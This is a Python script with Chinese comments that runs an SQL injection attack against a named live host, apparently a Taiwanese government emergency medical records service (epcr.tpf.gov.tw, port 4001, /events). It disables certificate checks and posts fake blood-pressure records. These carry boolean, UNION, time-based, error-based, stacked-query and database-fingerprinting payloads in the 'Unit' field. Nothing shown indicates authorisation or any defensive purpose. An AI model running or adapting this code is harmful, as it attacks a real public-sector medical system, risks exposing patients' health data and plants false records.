import http.client
import json
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

print("=== 4001 /events SQL 注入深度测试 ===\n")

# 从之前的测试我们知道 Unit 字段是整数类型
# 尝试各种 SQL 注入 payload

test_cases = [
    # 1. 基本整数注入
    {"name": "整数 0", "unit": "0"},
    {"name": "整数 1", "unit": "1"},
    {"name": "整数 -1", "unit": "-1"},
    
    # 2. 字符串注入
    {"name": "字符串 '1'", "unit": "'1'"},
    {"name": "字符串 ''", "unit": "''"},
    {"name": "字符串 ' OR '1'='1", "unit": "' OR '1'='1"},
    
    # 3. 数字型注入
    {"name": "数字 1", "unit": "1"},
    {"name": "数字 1 OR 1=1", "unit": "1 OR 1=1"},
    {"name": "数字 1; --", "unit": "1; --"},
    {"name": "数字 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "unit": "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"},
    
    # 4. 布尔盲注
    {"name": "布尔 TRUE", "unit": "1 AND 1=1"},
    {"name": "布尔 FALSE", "unit": "1 AND 1=2"},
    
    # 5. 时间盲注
    {"name": "SLEEP(2)", "unit": "1 AND SLEEP(2)"},
    {"name": "BENCHMARK", "unit": "1 AND BENCHMARK(10000000, MD5(1))"},
    
    # 6. 错误注入
    {"name": "CONCAT", "unit": "CONCAT(1,2)"},
    {"name": "EXTRACTVALUE", "unit": "EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))"},
    
    # 7. 注释注入
    {"name": "注释 /* */", "unit": "1/*comment*/"},
    {"name": "注释 #", "unit": "1#"},
]

for i, tc in enumerate(test_cases):
    try:
        conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=10, context=ctx)
        body = {
            'CaseID': 'SQLI_TEST_' + str(i),
            'recordUuid': 'SQLI_UUID_' + str(i),
            'TypeOfEventTxt': 'BP',
            'TypeOfEventNum': '110',
            'Caption': 'SQLi Test',
            'Value': '120/80',
            'Unit': tc['unit'],
            'Systolic': '120',
            'Diastolic': '80',
            'Mean': '100',
            'Timestamp': '2024-01-01T00:00:00.000Z',
            'Elapsed': 0
        }
        conn.request('POST', '/events', body=json.dumps(body), headers={'Content-Type': 'application/json'})
        resp = conn.getresponse()
        resp_body = resp.read().decode('utf-8', errors='replace')
        print(f"{i+1}. {tc['name']} (unit={tc['unit'][:30]})")
        print(f"   状态: {resp.status}")
        if resp.status == 500:
            try:
                err = json.loads(resp_body)
                print(f"   错误: {err.get('message', '')} | {str(err.get('errors', ''))[:100]}")
            except:
                print(f"   响应: {resp_body[:150]}")
        elif resp.status in [200, 201]:
            print(f"   ✓ 成功! 响应: {resp_body[:150]}")
        else:
            print(f"   响应: {resp_body[:100]}")
        conn.close()
    except Exception as e:
        print(f"{i+1}. {tc['name']}: Error {e}")

print("\n=== 测试 Unit 字段的 SQL 注入 ===\n")

# 更精确的 SQL 注入测试
sqli_tests = [
    # 数字型 - 正常
    ("正常整数", "42", "应该成功或特定错误"),
    # 数字型 - 注入
    ("1 OR 1=1", "1 OR 1=1", "布尔注入"),
    ("1 AND 1=2", "1 AND 1=2", "布尔注入(假)"),
    ("1 UNION SELECT NULL", "1 UNION SELECT NULL", "UNION 注入"),
    ("1; SELECT 1--", "1; SELECT 1--", "堆叠查询"),
    # 字符串型 - 如果 Unit 实际上是字符串
    ("'1'", "'1'", "字符串"),
    ("' OR ''='", "' OR ''='", "字符串注入"),
    # 函数
    ("VERSION()", "VERSION()", "版本函数"),
    ("DATABASE()", "DATABASE()", "数据库函数"),
    ("USER()", "USER()", "用户函数"),
]

print("Unit 字段 SQL 注入测试:")
for name, payload, desc in sqli_tests:
    try:
        conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=10, context=ctx)
        body = {
            'CaseID': 'SQLI_UNIT',
            'recordUuid': 'SQLI_UUID',
            'TypeOfEventTxt': 'BP',
            'TypeOfEventNum': '110',
            'Caption': 'Unit SQLi',
            'Value': '120/80',
            'Unit': payload,
            'Systolic': '120',
            'Diastolic': '80',
            'Mean': '100',
            'Timestamp': '2024-01-01T00:00:00.000Z',
            'Elapsed': 0
        }
        conn.request('POST', '/events', body=json.dumps(body), headers={'Content-Type': 'application/json'})
        resp = conn.getresponse()
        resp_body = resp.read().decode('utf-8', errors='replace')
        status_mark = "✓" if resp.status in [200, 201] else "✗"
        print(f"  {status_mark} {name} (Unit={payload})")
        if resp.status == 500:
            try:
                err = json.loads(resp_body)
                errors = err.get('errors', [])
                print(f"     错误: {errors[0][:100] if errors else ''}")
            except:
                print(f"     响应: {resp_body[:100]}")
        conn.close()
    except Exception as e:
        print(f"  ✗ {name}: Error {e}")
